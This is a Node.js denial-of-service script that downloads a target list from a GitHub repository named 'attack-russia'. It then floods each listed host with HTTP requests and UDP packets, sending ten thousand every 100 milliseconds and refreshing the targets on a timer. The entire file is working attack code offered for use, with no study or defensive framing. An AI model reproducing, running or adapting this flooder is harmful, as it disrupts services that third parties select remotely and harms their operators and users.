const https = require('https');
const request = require('request');
const udp = require('dgram');
//const net = require('net');

var DEBUG = true;
const requestCount = 10000;
const requestInterval = 100;
// once in 30mins
const intervalsUpdateLimit = 1 * 60 * 1000 / requestInterval;
const targetUrl = "https://raw.githubusercontent.com/andriytkachiv/attack-russia/master/targets.json";
var targets,
    intervalsCount;

// creating a client socket
let udpClient = udp.createSocket({type: 'udp4', reuseAddr: true});
//let tcpClient = new net.Socket();

let isHTTP = function (type) {
    return type && (type.toString().toUpperCase() === 'HTTP' || type.toString().toUpperCase() === 'HTTPS');
}
let isUDP = function (type) {
    return type && type.toString().toUpperCase() === 'UDP';
}
let isTCP = function (type) {
    return type && type.toString().toUpperCase() === 'TCP';
}

function sendUdp(ip, port){
    return new Promise(function(resolve, reject){

        var msg = Buffer.from('ping' + Math.random(), 'utf8');

        udpClient.send(msg, 0, msg.length, port, ip, function(err){
            DEBUG && console.log(msg.toString());
            return err ? reject(err) : resolve();
        });

    });
}

function sendHttp(url, port) {
    let urlObject = new URL(url.indexOf('http') !== -1 ? url : 'http://' + url);

    const options = {
        hostname: urlObject.host,
        port: urlObject.protocol === 'https:'? 443: (port? port : 80),
        path: urlObject.path,
        method: 'GET',
        timeout: 5000
    }

    try {
        const req = https.request(options, res => {
            DEBUG && console.log(`statusCode: ${res.statusCode}`)

            res.on('data', d => {
                //DEBUG && console.log(d);
            })
        })

        req.on('socket', function (socket) {
            socket.setTimeout(3000);
            socket.on('timeout', function() {
                req.abort();
            });
        });

        req.on('error', error => {
            DEBUG && console.error(error)
        })

        req.end()
    }
    catch (e) { console.log(e); }
}

// update targets
function updateTargets(callback) {
    request(targetUrl, function(error, response, body) {
        targets = JSON.parse(body);
        intervalsCount = 0;

        DEBUG && console.log('Targets updated!');
        DEBUG && console.log(targets);

        if (typeof  callback === 'function') {
            callback();
        }

        DEBUG && console.log(targets);
    });
}

updateTargets(function() {
    for (let item of targets) {
        setInterval(() => {
            if (intervalsCount > intervalsUpdateLimit) {
                updateTargets();
            }

            for (let i = 1; i <= requestCount; i++) {

                if (isTCP(item.type)) {

                } else if (isUDP(item.type)) {
                    sendUdp(item.url, item.port);
                } else {
                    sendHttp(item.url, item.port);
                }
            }
            intervalsCount++;
        }, requestInterval);
    }
});

